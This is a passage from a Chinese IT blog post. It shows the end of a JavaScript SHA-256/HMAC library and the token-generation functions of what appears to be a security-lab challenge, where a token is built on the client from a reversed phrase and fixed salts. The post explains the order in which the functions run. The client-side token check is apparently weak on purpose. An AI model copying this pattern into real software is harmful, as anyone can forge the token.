                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">ARRAY_BUFFER</span> <span class="token operator">||</span> <span class="token operator">!</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Sha256</span><span class="token punctuation">(</span>is224<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> oKeyPad <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            iKeyPad <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">var</span> b <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">;</span>
            oKeyPad<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x5c</span> <span class="token operator">^</span> b<span class="token punctuation">;</span>
            iKeyPad<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x36</span> <span class="token operator">^</span> b
        <span class="token punctuation">}</span>
        <span class="token function">Sha256</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> is224<span class="token punctuation">,</span> sharedMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>iKeyPad<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>oKeyPad <span class="token operator">=</span> oKeyPad<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>inner <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>sharedMemory <span class="token operator">=</span> sharedMemory
    <span class="token punctuation">}</span>
    <span class="token class-name">HmacSha256</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sha256</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HmacSha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">finalize</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>inner<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>inner <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> innerHash <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">Sha256</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>is224<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sharedMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>oKeyPad<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>innerHash<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> exports <span class="token operator">=</span> <span class="token function">createMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exports<span class="token punctuation">.</span>sha256 <span class="token operator">=</span> exports<span class="token punctuation">;</span>
    exports<span class="token punctuation">.</span>sha224 <span class="token operator">=</span> <span class="token function">createMethod</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exports<span class="token punctuation">.</span>sha256<span class="token punctuation">.</span>hmac <span class="token operator">=</span> <span class="token function">createHmacMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exports<span class="token punctuation">.</span>sha224<span class="token punctuation">.</span>hmac <span class="token operator">=</span> <span class="token function">createHmacMethod</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">COMMON_JS</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        module<span class="token punctuation">.</span>exports <span class="token operator">=</span> exports
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        root<span class="token punctuation">.</span>sha256 <span class="token operator">=</span> exports<span class="token punctuation">.</span>sha256<span class="token punctuation">;</span>
        root<span class="token punctuation">.</span>sha224 <span class="token operator">=</span> exports<span class="token punctuation">.</span>sha224<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">AMD</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">define</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> exports
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">do_something</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> n <span class="token operator">=</span> e<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> n <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> n<span class="token operator">--</span><span class="token punctuation">)</span> t <span class="token operator">+=</span> e<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> t
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">token_part_3</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token string">"ZZ"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">+</span> y<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">token_part_2</span><span class="token punctuation">(</span>e <span class="token operator">=</span> <span class="token string">"YY"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>e <span class="token operator">+</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">token_part_1</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">do_something</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">token_part_2</span><span class="token punctuation">(</span><span class="token string">"XX"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> token_part_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">token_part_1</span><span class="token punctuation">(</span><span class="token string">"ABCD"</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<blockquote> 
 <p>执行part1，然后延迟300ms执行part2，点击按钮执行part3</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/84/31/gZvILf94_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7bc2dd3e9521b58bbdbd3774d3bcca6d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">深度学习通用训练步骤</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/20d2a8b0f25558a863aef7b8aacab594/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">armeabi-v7a arm64-v8a armeabi都是什么意思</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>